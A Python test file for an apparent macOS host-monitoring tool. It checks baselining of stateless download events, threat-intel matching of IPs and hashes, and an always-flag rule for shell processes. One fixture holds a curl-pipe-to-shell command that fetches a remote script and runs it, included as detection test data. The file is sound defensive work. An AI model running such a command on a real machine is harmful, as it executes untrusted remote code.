"""Event (stateless) shape and the snapshot-wide intel match."""
from __future__ import annotations

import time

import accept
import baseline as baseline_mod
import paths
import triage
from collectors._base import Anomaly, Evidence, write_json
from intel import db as ioc_db


def test_stateless_reported_once_never_baselined():
    ev = Evidence("downloads", "risky_download", "dl|/x.dmg|1", {"ext": ".dmg"})
    snapshot = {"downloads": [ev], "launchd": [Evidence("launchd", "launchd_item", "/a.plist", {})]}
    versions = {"downloads": 1, "launchd": 1}
    stateless = {"downloads": True}
    boot = baseline_mod.from_snapshot(snapshot, versions, {}, stateless)
    assert list(boot) == ["launchd@1::/a.plist"]
    anomalies = baseline_mod.diff_against(snapshot, boot, versions, {}, {}, stateless)
    assert [(a.change, a.evidence.collector) for a in anomalies] == [("added", "downloads")]
    # a second run with the same event evidence reports it again — the collector windows, not the diff
    assert len(baseline_mod.diff_against(snapshot, boot, versions, {}, {}, stateless)) == 1


def test_accept_ignores_stateless(monkeypatch):
    ts = "20260102T000000Z"
    d = paths.STATE_DIR / "snapshots" / ts
    d.mkdir(parents=True, exist_ok=True)
    ev = {"collector": "downloads", "kind": "risky_download", "key": "dl|/x|1", "attrs": {}}
    write_json(d / "diff.json", {"anomalies": [{"change": "added", "suppressed": False, "evidence": ev}]})
    monkeypatch.setattr(accept, "_collector_meta", lambda: ({"downloads": 1}, {}, {"downloads"}))
    before = dict(baseline_mod.load(paths.STATE_DIR))
    res = accept.accept(None, snapshot_ts=ts, all_=True)
    assert res["accepted"] == [] and baseline_mod.load(paths.STATE_DIR) == before


def test_intel_flags_baselined_evidence(tmp_path):
    db = tmp_path / "ioc.sqlite"
    with ioc_db.connect(db) as conn:
        ioc_db.upsert(conn, "ip", "203.0.113.9", "feodo", "critical", time.time(), None)
        ioc_db.upsert(conn, "hash_sha256", "ab" * 32, "threatfox", "high", time.time(), None)
        ioc_db.upsert(conn, "mitre_id", "T1059", "mitre_macos", None, time.time(), None)
    baselined = Evidence("network", "outbound", "out|Google Chrome|443",
                         {"command": "Google Chrome", "remote_port": 443, "remote_ips": ["1.1.1.1", "203.0.113.9"]})
    new_proc = Evidence("processes", "process", "/tmp/x", {"exe": "/tmp/x", "exe_sha256": "ab" * 32})
    clean = Evidence("processes", "process", "/bin/ls", {"exe": "/bin/ls"})
    anomalies = [Anomaly(change="added", evidence=new_proc)]
    hits = triage.apply_intel(anomalies, {"network": [baselined], "processes": [new_proc, clean]}, db_path=db)
    assert hits == 2
    by_key = {a.evidence.key: a for a in anomalies}
    assert by_key["/tmp/x"].floor_severity == "critical" and by_key["/tmp/x"].evidence.attrs["intel"][0]["feed"] == "threatfox"
    assert by_key["out|Google Chrome|443"].change == "flagged"
    assert by_key["out|Google Chrome|443"].evidence.attrs["intel"][0]["value"] == "203.0.113.9"
    assert "/bin/ls" not in by_key


def test_intel_ip_port_normalised_and_missing_db(tmp_path):
    db = tmp_path / "ioc.sqlite"
    with ioc_db.connect(db) as conn:
        ioc_db.upsert(conn, "ip", "203.0.113.9", "urlhaus", "high", time.time(), None)
    a = Anomaly(change="added", evidence=Evidence("x", "y", "k", {"remote_ip": "203.0.113.9:8080"}))
    assert triage.apply_intel([a], None, db_path=db) == 1 and a.floor_severity == "critical"
    assert triage.apply_intel([a], None, db_path=tmp_path / "absent.sqlite") == 0


def test_always_rule_flags_baselined_shell():
    rules = triage.load_rules()
    bash = Evidence("processes", "process", "/bin/bash",
                    {"exe": "/bin/bash", "commands": ["bash -c 'curl -fsSL http://x/i.sh | sh'"]})
    quiet = Evidence("processes", "process", "/bin/ls", {"exe": "/bin/ls", "commands": ["ls -la"]})
    script = Evidence("processes", "process", "/bin/zsh",
                      {"exe": "/bin/zsh", "commands": ["/bin/zsh /Users/me/Downloads/installer.command"]})
    anomalies: list[Anomaly] = []
    assert triage.apply_always(anomalies, {"processes": [bash, quiet, script]}, rules) == 2
    flagged = {a.evidence.key: a for a in anomalies}
    assert flagged["/bin/bash"].change == "flagged" and flagged["/bin/bash"].floor_severity == "high"
    assert flagged["/bin/zsh"].floor_severity == "high" and "/bin/ls" not in flagged
